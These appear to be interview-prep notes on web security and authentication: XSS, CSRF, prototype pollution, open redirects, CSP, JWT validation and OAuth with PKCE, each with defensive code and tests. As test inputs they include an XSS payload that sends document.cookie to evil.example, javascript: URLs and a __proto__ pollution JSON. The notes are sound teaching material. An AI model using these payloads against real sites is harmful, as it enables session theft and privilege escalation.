# Web Security & Authentication

Security questions are standard for senior roles, and your projects make them unavoidable: **Azure AD SSO** (scQuill), **JWT auth for Prosody/Jitsi**, **police and court documents** (RBF, scQuill), an **Electron app** rendering user content, and an **embeddable conferencing iframe**. Know the attacks, the defences, and the OAuth/OIDC flows in detail.

## Common attacks

### What is XSS? What are the types, and how do you prevent it in React apps? 🔥

**Cross-Site Scripting** means an attacker gets **their JavaScript to run in your origin**, in another user's browser. From there they can steal tokens from web storage, act as the user, read the page, log keystrokes, or turn into **RCE in Electron** if Node integration were enabled.

**Types:**

1. **Stored:** the payload is saved on the server and served to others: a chat message, a display name, a document title, a whiteboard text element.
2. **Reflected:** the payload comes from the request (a URL parameter) and is echoed into the response.
3. **DOM-based:** client-side JS writes attacker-controlled data (`location.hash`, `postMessage` data) into a dangerous sink (`innerHTML`, `eval`, `setTimeout(string)`, `location = …`).

**React's protection:** JSX **escapes** interpolated values (`{userInput}` is rendered as text). **The escape hatches are where XSS happens:**

- `dangerouslySetInnerHTML` with unsanitised HTML (rich-text or markdown rendering)
- **`href`/`src` with `javascript:` URLs**: `<a href={user.website}>`. React 19 blocks `javascript:` URLs in `href`/`src` attributes.
- direct DOM writes through refs (`ref.current.innerHTML = …`), and third-party libraries that do the same
- SSR: injecting JSON state into `<script>` without escaping `</script>` and `<!--`
- **`eval`/`new Function`/`setTimeout(string)`** with user data

**Defences (in layers):**

1. **Output encoding by context** (frameworks do this for text). **Sanitise HTML** with **DOMPurify** (or the Sanitizer API) when you must render user HTML.
2. **Validate URLs:** allow-list `http:`, `https:` and `mailto:`.
3. **Content Security Policy** with nonces or hashes (blocks inline and injected scripts), plus **Trusted Types** (forces sinks like `innerHTML` to accept only sanitised types).
4. **HttpOnly cookies** for sessions, so XSS can't read the token.
5. Input validation on the server. Escape when you store **and** when you render.

```js
// Safe URL handling + escaping — the two most common XSS fixes in React codebases
function safeUrl(input, allowed = ['http:', 'https:', 'mailto:']) {
  try {
    const url = new URL(input, 'https://app.example.com');      // resolves relative URLs safely
    return allowed.includes(url.protocol) ? url.href : 'about:blank';
  } catch {
    return 'about:blank';
  }
}

const escapeHtml = (s) => String(s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]);

const displayName = '<img src=x onerror="fetch(`https://evil.example/?c=`+document.cookie)">';
console.log(escapeHtml(displayName));
console.log(safeUrl('javascript:alert(1)'), safeUrl('  JaVaScRiPt:alert(1)'), safeUrl('/profile/42'), safeUrl('https://zaki.dev'));

test('blocks script URLs and escapes markup', () => {
  expect(safeUrl('javascript:alert(document.domain)')).toBe('about:blank');
  expect(safeUrl('data:text/html,<script>alert(1)</script>')).toBe('about:blank');
  expect(safeUrl('/m/standup')).toBe('https://app.example.com/m/standup');
  expect(escapeHtml(displayName)).not.toContain('<img');
});
```

### What is CSRF and how do you defend against it? 🔥

**Cross-Site Request Forgery:** a malicious site makes the victim's browser send a **state-changing request** to your site, **with the victim's cookies attached automatically**. Example: a hidden form that POSTs `/api/meetings/123/delete`. The attacker can't read the response; they only need the side effect.

**Defences:**

1. **`SameSite` cookies:** `Lax` (the default in modern browsers) blocks cookies on cross-site POSTs and subresource requests. `Strict` is stronger. That's a big mitigation, but **not complete** on its own: same-site subdomains can still attack, and `Lax` allows top-level GET, so **never change state on GET**.
2. **CSRF tokens:**
   - **synchronizer token pattern:** a random token in the session, embedded in forms and headers, verified by the server
   - or the **double-submit cookie**: the token in both a cookie and a header, compared by the server (signed or HMAC-bound to the session for safety)
3. **Check `Origin`/`Referer`** headers on state-changing requests.
4. **Custom request headers** (`X-Requested-With`, or `Authorization: Bearer …`). Cross-site requests with custom headers require a **CORS preflight**, which your server won't approve for foreign origins.
5. **Bearer tokens in an `Authorization` header** (not cookies) are **not vulnerable to CSRF**, because the browser doesn't attach them automatically. The trade-off is that the token must be readable by JS, which **increases XSS impact**.

### What is clickjacking and how do you prevent it?

**Clickjacking:** an attacker loads your site in an **invisible iframe** over their own UI and tricks users into clicking your buttons ("Allow camera", "Delete", "Transfer").

**Defence:** forbid framing with **`Content-Security-Policy: frame-ancestors 'none'`** (or an allow-list of trusted embedders), plus the legacy `X-Frame-Options: DENY`/`SAMEORIGIN`.

**For an embeddable product** such as the Jitsi/MeetHour IFrame API, use an **allow-list** of customer origins in `frame-ancestors`. The embedder must also grant capabilities: `<iframe allow="camera; microphone; display-capture; fullscreen; autoplay">` (Permissions Policy).

### What is prototype pollution? Show it and the fix 🔥

A **JavaScript-specific** vulnerability. A naive deep merge, clone or set of untrusted JSON writes to `__proto__` (or `constructor.prototype`), which **modifies `Object.prototype` for the whole application**. Consequences:

- bypassing checks (`if (user.isAdmin)` becomes true for every object)
- denial of service
- sometimes RCE through gadgets in templating or child-process options (on the server)

```js
function naiveMerge(target, source) {
  for (const key in source) {
    if (source[key] && typeof source[key] === 'object') {
      target[key] ??= {};
      naiveMerge(target[key], source[key]);
    } else target[key] = source[key];
  }
  return target;
}

function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;   // block dangerous keys
    const value = source[key];
    if (value && typeof value === 'object' && !Array.isArray(value)) {
      if (!Object.hasOwn(target, key) || typeof target[key] !== 'object') target[key] = Object.create(null);
      safeMerge(target[key], value);
    } else target[key] = value;
  }
  return target;
}

const attackerJson = JSON.parse('{"theme":"dark","__proto__":{"isAdmin":true}}');   // JSON.parse creates an own "__proto__" key

safeMerge({}, attackerJson);
console.log('after safeMerge, ({}).isAdmin =', ({}).isAdmin);

naiveMerge({}, attackerJson);
console.log('after naiveMerge, ({}).isAdmin =', ({}).isAdmin, '← every object is now "admin"');
const polluted = ({}).isAdmin;
delete Object.prototype.isAdmin;           // clean up so the rest of the program is unaffected

test('naive merge pollutes Object.prototype; safe merge does not', () => {
  expect(polluted).toBe(true);
  expect(({}).isAdmin).toBeUndefined();
});
```

**Defences:**

- block the `__proto__`, `constructor` and `prototype` keys
- use `Object.create(null)` dictionaries or `Map`
- **validate input against schemas** (zod) that reject unknown keys
- `Object.freeze(Object.prototype)` in hardened environments
- keep libraries updated (lodash `merge` had CVEs)
- Node's `--disable-proto=delete`

### What is an open redirect and how do you avoid it?

Login flows often use `?next=/dashboard`. If the app blindly redirects to `next`, an attacker can send `https://yourapp.com/login?next=https://evil.com` to **phish** with your trusted domain. In OAuth, a bad redirect URI can **leak tokens**.

**Fix:** allow **only relative paths** on your origin (not `//evil.com`), or an explicit allow-list. OAuth providers must **exactly match registered redirect URIs**.

```js
function safeNext(next, origin = 'https://app.example.com') {
  if (typeof next !== 'string' || !next.startsWith('/') || next.startsWith('//') || next.startsWith('/\\')) return '/';
  const url = new URL(next, origin);
  return url.origin === origin ? url.pathname + url.search + url.hash : '/';
}

test('only same-origin relative paths are allowed', () => {
  expect(safeNext('/meetings/42?tab=rec')).toBe('/meetings/42?tab=rec');
  expect(safeNext('https://evil.com')).toBe('/');
  expect(safeNext('//evil.com/path')).toBe('/');
  expect(safeNext('/\\evil.com')).toBe('/');
  expect(safeNext('javascript:alert(1)')).toBe('/');
});
```

### How do you use `postMessage` safely (e.g. with an embedded meeting iframe)? 🔥

`window.postMessage` lets cross-origin windows and iframes communicate. The Jitsi **IFrame API** uses it (the host page sends commands such as `toggleAudio`, and the meeting iframe emits events such as `participantJoined`). **The security rules:**

1. **When sending:** always specify the **exact target origin**, `iframe.contentWindow.postMessage(msg, 'https://meet.example.com')`. Never use `'*'` for sensitive data.
2. **When receiving:** **check `event.origin`** against an allow-list (and optionally `event.source`). Then **validate the message shape**; never `eval` it or insert it into the DOM as HTML.
3. Use **structured, typed messages** with a protocol version, and ignore unknown types.
4. Sandbox untrusted iframes: `sandbox="allow-scripts"` without `allow-same-origin` for user-provided embeds.

```js
const ALLOWED_ORIGINS = new Set(['https://meet.example.com', 'https://customer-portal.example.org']);
const COMMANDS = { toggleAudio: () => 'audio toggled', toggleVideo: () => 'video toggled', hangup: () => 'left meeting' };

function handleMessage(event) {
  if (!ALLOWED_ORIGINS.has(event.origin)) return { ignored: `untrusted origin ${event.origin}` };
  const { type, command } = event.data ?? {};
  if (type !== 'meethour-command' || !Object.hasOwn(COMMANDS, command)) return { ignored: 'unknown message' };
  return { ok: COMMANDS[command]() };
}

console.log(handleMessage({ origin: 'https://evil.example', data: { type: 'meethour-command', command: 'hangup' } }));
console.log(handleMessage({ origin: 'https://customer-portal.example.org', data: { type: 'meethour-command', command: 'toggleAudio' } }));
console.log(handleMessage({ origin: 'https://meet.example.com', data: { type: 'meethour-command', command: 'constructor' } }));

test('origin and message validation', () => {
  expect(handleMessage({ origin: 'https://meet.example.com', data: { type: 'meethour-command', command: 'hangup' } })).toEqual({ ok: 'left meeting' });
  expect(handleMessage({ origin: 'https://meet.example.com.evil.io', data: { type: 'meethour-command', command: 'hangup' } }).ignored).toMatch(/untrusted/);
});
```

## Security headers & CSP

### What is Content Security Policy? Write one for a conferencing app 🔥

**CSP** is an HTTP response header that tells the browser **which sources are allowed** for scripts, styles, images, connections, frames and so on. It's the strongest **XSS mitigation layer**: even if an attacker injects markup, their inline or foreign scripts won't execute.

**Key directives:**

- `default-src` (the fallback)
- **`script-src`** with **nonces** (`'nonce-r4nd0m'`, a new value per response) or **hashes**, plus **`'strict-dynamic'`** (scripts loaded by trusted scripts are trusted)
- `style-src`, `img-src`, **`connect-src`** (fetch, XHR, **WebSocket**/XMPP endpoints, Sentry), **`media-src`** (blob: for streams), `worker-src`, `frame-src`
- **`frame-ancestors`** (clickjacking)
- `object-src 'none'`, `base-uri 'none'`, `form-action`
- `upgrade-insecure-requests`
- **`report-to`/`report-uri`**

**Roll out safely:** start with **`Content-Security-Policy-Report-Only`**, collect violation reports, fix the issues, then enforce.

```text
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM}' 'strict-dynamic';
  style-src 'self' 'nonce-{RANDOM}';
  img-src 'self' data: blob: https://avatars.example-cdn.com;
  media-src 'self' blob:;
  connect-src 'self' wss://meet.example.com https://api.example.com https://o123.ingest.sentry.io;
  worker-src 'self' blob:;
  frame-src https://whiteboard.example.com;
  frame-ancestors https://customer-portal.example.org;
  object-src 'none';
  base-uri 'none';
  form-action 'self';
  upgrade-insecure-requests;
  report-to csp-endpoint
```

**Avoid `'unsafe-inline'` and `'unsafe-eval'`** in `script-src`; they defeat the purpose. Some libraries need `'wasm-unsafe-eval'` for WebAssembly, such as the TFLite virtual-background models.

### Which other security headers should every app send?

| Header | Purpose |
|---|---|
| **`Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`** | **HSTS**: always use HTTPS and never downgrade; prevents SSL stripping |
| `X-Content-Type-Options: nosniff` | Don't MIME-sniff (prevents script execution from mislabelled uploads) |
| `Referrer-Policy: strict-origin-when-cross-origin` | Don't leak full URLs (with tokens or meeting IDs) to other sites |
| **`Permissions-Policy: camera=(self), microphone=(self), display-capture=(self), geolocation=()`** | Restrict powerful features for your pages **and embedded iframes** |
| `Cross-Origin-Opener-Policy: same-origin` | Isolates your browsing context group from cross-origin popups; with COEP it gives **cross-origin isolation** (needed for `SharedArrayBuffer`, precise timers) |
| `Cross-Origin-Embedder-Policy: require-corp` / `credentialless` | Only load cross-origin resources that opt in |
| `Cross-Origin-Resource-Policy: same-site` | Prevent other sites from embedding your resources |
| `Content-Security-Policy` | See above |

## Authentication & authorisation

### Sessions vs JWTs: what are the trade-offs? 🔥

| | Server-side sessions (session ID cookie) | JWT (self-contained token) |
|---|---|---|
| State | **Stateful**: session data stored server-side (Redis/DB) | **Stateless**: claims inside the signed token |
| Revocation | **Easy**: delete the session | **Hard** before expiry: needs short TTLs, denylists or token versioning |
| Scaling | Needs a shared session store | Any server with the key can verify, which suits microservices and **Prosody verifying meeting tokens** |
| Size | Small cookie | Larger (sent on every request) |
| Typical transport | `HttpOnly` cookie | `Authorization: Bearer` header, or an HttpOnly cookie |
| Risks | CSRF (mitigated with SameSite + tokens) | Token theft via XSS if stored in JS-accessible storage; `alg` confusion; overly long expiry |

**Common modern pattern:**

- **short-lived access tokens** (5–15 min) plus **refresh tokens** (longer, **rotated** on each use, with **reuse detection**, and stored in an **HttpOnly, Secure, SameSite** cookie)
- or a **BFF** (backend-for-frontend) that keeps tokens server-side and gives the browser only a session cookie. The BFF is the most secure option for SPAs.

### How must a JWT be validated? 🔥

A JWT is `base64url(header).base64url(payload).signature`. **Base64url is encoding, not encryption**: anyone can read the claims, so never put secrets in them (use JWE if you need encryption).

**Validation checklist (server side):**

1. **Verify the signature with the expected algorithm.** Pin the allowed `alg`s. Reject **`alg: none`**. Prevent **algorithm confusion**, e.g. an RS256 public key used as an HS256 secret.
2. Select the key by **`kid`** from a trusted **JWKS** (cache it, and handle key rotation).
3. Check **`exp`** (expiry) and **`nbf`** (not before), with a small clock-skew allowance.
4. Check **`iss`** (the expected issuer) and **`aud`** (this API is the intended audience). A token issued for a different API must be rejected.
5. Check application claims: **scopes/roles**, tenant, and for Jitsi the **`room`** claim.
6. **Use a vetted library** (`jose`, `jsonwebtoken`, MSAL/Microsoft.Identity.Web). Don't hand-roll crypto in production.

**Frontend:** decoding a JWT for **display** (the user's name, expiry for proactive refresh) is fine. **Never make authorisation decisions only on the client.**

### Explain OAuth 2.0 and the Authorization Code flow with PKCE 🔥

**OAuth 2.0** is an **authorisation delegation** framework: a client app gets an **access token** to call an API **on behalf of a user**, without handling the user's password.

**Roles:** the **resource owner** (user), the **client** (your SPA or mobile app), the **authorization server** (Entra ID, Auth0, Keycloak, Cognito) and the **resource server** (your API).

**Authorization Code + PKCE** (the recommended flow for SPAs and mobile; required by OAuth 2.1):

1. The client generates a random **`code_verifier`** and computes **`code_challenge = BASE64URL(SHA-256(code_verifier))`**.
2. Redirect to `/authorize?response_type=code&client_id&redirect_uri&scope=openid profile api.read&state=<random>&code_challenge=<…>&code_challenge_method=S256` (plus a `nonce` for OIDC).
3. The user authenticates (SSO, MFA) and consents. The server redirects back with `?code=…&state=…`. **Verify `state`** (CSRF protection for the flow).
4. The client POSTs to `/token` with the `code` **and the original `code_verifier`**. The server checks `SHA-256(verifier) == challenge`. That's PKCE: **an intercepted code is useless without the verifier**.
5. The response contains an **access token** (and a **refresh token**; with OIDC, also an **ID token**).

**Other flows:**

- **Client Credentials:** service-to-service, with no user (a Jibri finalize script calling your API).
- **Device Code:** TVs and CLIs.
- **Deprecated:** **Implicit** (tokens in the URL fragment, leaky) and **Resource Owner Password Credentials** (the app sees the password).

```js
// PKCE helpers (browser/worker/Node 18+), verified against RFC 7636 Appendix B test vector
const base64url = (bytes) => btoa(String.fromCharCode(...bytes)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');

function createCodeVerifier(length = 64) {
  const bytes = crypto.getRandomValues(new Uint8Array(length));
  return base64url(bytes).slice(0, 128);                         // 43–128 chars from the unreserved set
}

async function codeChallengeS256(verifier) {
  const digest = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(verifier));
  return base64url(new Uint8Array(digest));
}

const rfcVerifier = 'dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk';
const challenge = await codeChallengeS256(rfcVerifier);
console.log({ code_verifier: rfcVerifier, code_challenge: challenge, method: 'S256' });

const authorizeUrl = new URL('https://login.microsoftonline.com/<tenant>/oauth2/v2.0/authorize');
Object.entries({
  client_id: '<app-id>', response_type: 'code', redirect_uri: 'https://scquill.example/auth/callback',
  scope: 'openid profile offline_access api://scquill/Transcripts.ReadWrite',
  state: crypto.randomUUID(), code_challenge: challenge, code_challenge_method: 'S256',
}).forEach(([k, v]) => authorizeUrl.searchParams.set(k, v));
console.log(authorizeUrl.toString().slice(0, 120) + '…');

test('RFC 7636 test vector', () => {
  expect(challenge).toBe('E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM');
  expect(createCodeVerifier().length).toBeGreaterThanOrEqual(43);
});
```

### OAuth vs OpenID Connect vs SAML: what's the difference? 🔥

- **OAuth 2.0** is **authorisation**: "this app may call this API with these scopes". The access token is meant for the **API**, not for the client to learn who the user is.
- **OpenID Connect (OIDC)** is an **authentication** layer **on top of OAuth 2.0**. It adds:
  - the **ID token** (a JWT with user identity claims: `sub`, `name`, `email`, `iss`, `aud` = your client ID, `nonce`)
  - the `openid` scope, the **UserInfo** endpoint
  - **discovery** (`/.well-known/openid-configuration`) and JWKS
  
  It's the modern standard for **login / SSO**: Entra ID, Google, Okta, Auth0, Cognito.
- **SAML 2.0** is an older XML-based **enterprise SSO** standard (signed XML assertions, browser POST/redirect bindings). It's still common in enterprises and government; IdPs such as Entra ID support both.
- **Rule:** use the **ID token** to know **who** logged in (on the client), and the **access token** to **call APIs**. Never send ID tokens to APIs as authorisation.

### How did SSO with Azure AD (Entra ID) work in scQuill, and how do you secure it? 🔥

(See the ScaleCapacity doc for the MSAL code.)

1. **App registrations:**
   - an **SPA** registration (redirect URIs, PKCE)
   - an **API** registration exposing **scopes** (`Transcripts.ReadWrite`) and **app roles** (`Reviewer`, `Admin`)
   - the SPA is granted those scopes; admin consent for the tenant
2. **Login:** MSAL performs **Authorization Code + PKCE** → ID token (user) + access token for `api://scquill` + a refresh token (handled by MSAL, rotated).
3. **API calls:** `acquireTokenSilent` → `Authorization: Bearer <access_token>`.
4. **API validation** (API Gateway JWT authorizer or Lambda):
   - signature via the tenant's **JWKS**
   - `iss` = `https://login.microsoftonline.com/<tenant-id>/v2.0`
   - **`aud` = the API's app ID URI or client ID**
   - `exp`/`nbf`
   - **`scp`** (delegated scopes) and/or **`roles`** (app roles) for authorisation
   - `tid` to make sure the token comes from **your** tenant (critical for multi-tenant apps)
5. **Hardening:**
   - **Conditional Access** (MFA, compliant devices, location) is configured in Entra
   - short token lifetimes
   - sessionStorage or in-memory caching
   - a strict CSP to reduce XSS risk
   - logout clears the MSAL cache and the IdP session
   - least-privilege scopes

### Where should a SPA store tokens? 🔥

| Option | XSS impact | CSRF risk | Notes |
|---|---|---|---|
| `localStorage` | **Token stolen** (persistent) | None | Simple, but riskiest if XSS happens |
| `sessionStorage` | Token stolen (only this tab's session) | None | MSAL's common choice; slightly better |
| **In memory** (JS variable) | Can be used while the page is open, but it's harder to exfiltrate and gone on reload | None | Needs **silent renewal** (refresh-token cookie or a hidden iframe/SSO session) |
| **HttpOnly Secure cookie** | **Not readable by JS** (XSS can still make requests while the page is open) | Needs SameSite + CSRF defences | Best for session or refresh tokens; same-site API or a BFF |
| **BFF pattern** | Tokens never reach the browser | Cookie session with SameSite + CSRF protection | **Most secure for high-value apps**; recommended by the IETF "OAuth 2.0 for Browser-Based Apps" guidance |

**Key insight:** **XSS defeats every client-side storage option** to some degree, because an attacker can call your API from your page. Preventing XSS (CSP, sanitising) matters more than where the token lives. HttpOnly just limits **exfiltration** and persistence.

### How do you store passwords securely, and what are passkeys?

- **Never store plaintext or reversible encryption.** Use a **slow, salted, adaptive hash**: **Argon2id** (preferred), **scrypt** or **bcrypt** (cost ≥ 10–12). Each password gets a **unique random salt** (included in the hash string), plus an optional **pepper** (a secret kept outside the DB).
- **Not** MD5 or SHA-256 alone: they're too fast, so GPUs can brute-force billions per second.
- **Account security:**
  - **rate limiting** and lockouts with backoff
  - checking breached-password lists (HIBP k-anonymity API)
  - **MFA** (TOTP, push, WebAuthn)
  - secure reset flows (single-use, short-lived tokens; don't reveal whether an email exists → avoid **account enumeration**)
- **Passkeys (WebAuthn/FIDO2):** a public/private **key pair per site**. The private key stays on the device (synced by the platform keychain); the server stores only the public key.
  - **phishing-resistant**, because the browser binds the credential to the **origin**
  - nothing reusable to steal from the server
  - API: `navigator.credentials.create()` / `get()` with a server challenge

## Platform & supply chain

### How do you secure the frontend supply chain and dependencies? 🔥

- **Lockfiles committed**; install with **`npm ci`** in CI (exact, reproducible).
- **Automated updates and alerts:** Dependabot or Renovate, `npm audit` / `osv-scanner` / Snyk in CI. Triage the findings: many are dev-only or unreachable.
- **Minimise dependencies** and check maintainer health. Be wary of **typosquatting** and newly published versions.
- **2025 was a wake-up call:** maintainers of hugely popular npm packages were phished and malicious versions were published, and a self-replicating worm spread through stolen npm tokens.
  - **pin versions** and delay adopting brand-new releases (e.g. a minimum release age in Renovate or pnpm)
  - use **npm trusted publishing (OIDC)** and **provenance attestations**
  - enforce **2FA/passkeys** for publishers
  - **disable install scripts** where possible (`ignore-scripts`, pnpm's allow-list for build scripts)
- **Subresource Integrity (SRI)** for third-party scripts from CDNs: `<script src integrity="sha384-…" crossorigin>`.
- **Secrets:** never in the frontend bundle. Anything in `NEXT_PUBLIC_`/`VITE_` variables is public. Scan repos for secrets (gitleaks, GitHub secret scanning).

### What security concerns are specific to a video-conferencing product?

- **Meeting access:**
  - unguessable room names (not `/standup`)
  - **JWT-gated rooms** with room-scoped claims
  - **lobby** and passwords
  - ability to lock meetings
  - protection against "zoom-bombing" (moderators can kick/ban and mute all)
- **Authorisation enforced on the server** (Prosody modules / Jicofo) for recording, streaming, muting others and promoting visitors. **Never rely on hiding buttons.**
- **Recording consent and indicators** (legal requirements). Secure storage of recordings: private S3, **short-lived pre-signed URLs**, encryption, retention policies.
- **E2EE option** for sensitive meetings (accepting that recording and transcription won't work).
- **TURN credential hygiene** (time-limited), protection of internal component accounts (focus, jvb, jibri credentials), and firewalling internal ports (XMPP 5222 for components shouldn't be public).
- **XSS through user-controlled content** (display names, chat, whiteboard text, polls), which is especially dangerous in the **Electron app**.
- **Embedding:** an allow-list for `frame-ancestors`, `postMessage` origin checks, Permissions-Policy delegation.
- **Privacy:** minimise logs of PII, mDNS candidate obfuscation, and GDPR/data residency (region-pinned shards).
